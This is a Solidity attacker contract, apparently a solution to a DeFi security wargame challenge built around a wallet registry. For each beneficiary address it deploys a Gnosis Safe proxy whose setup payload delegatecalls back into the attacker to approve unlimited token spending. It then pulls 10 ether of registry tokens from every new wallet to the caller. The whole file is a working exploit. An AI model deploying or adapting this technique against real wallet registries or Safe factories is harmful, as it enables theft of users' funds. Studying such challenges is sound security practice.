// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./WalletRegistry.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract WalletRegistryAttacker {
    
    IGnosisSafeProxyFactory private immutable gnosisSafeProxyFactory;
    
    WalletRegistry private immutable walletRegistry;

    constructor(address proxyFactoryAddr, address walletRegistryAddr) {
        gnosisSafeProxyFactory = IGnosisSafeProxyFactory(proxyFactoryAddr);
        walletRegistry = WalletRegistry(walletRegistryAddr);
    }

    function approve(address spender, address token) external {
        IERC20(token).approve(spender, type(uint256).max);
    }

    function attack(address[] calldata owners) external {
        for(uint i = 0; i < owners.length; i++) {
            address owner = owners[i];
            address[] memory os = new address[](1);
            os[0] = owner;
            bytes memory initData = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
                                                             os,
                                                             1,
                                                             address(this),
                                                             abi.encodeWithSignature("approve(address,address)", address(this), address(walletRegistry.token())),
                                                             address(0),
                                                             address(0),
                                                             0,
                                                             address(0));
            GnosisSafeProxy proxy = gnosisSafeProxyFactory.createProxyWithCallback(
                walletRegistry.masterCopy(), 
                initData, 
                0, 
                IProxyCreationCallback(address(walletRegistry)));

            IERC20(address(walletRegistry.token())).transferFrom(address(proxy), msg.sender, 10 ether);
        }

    }
}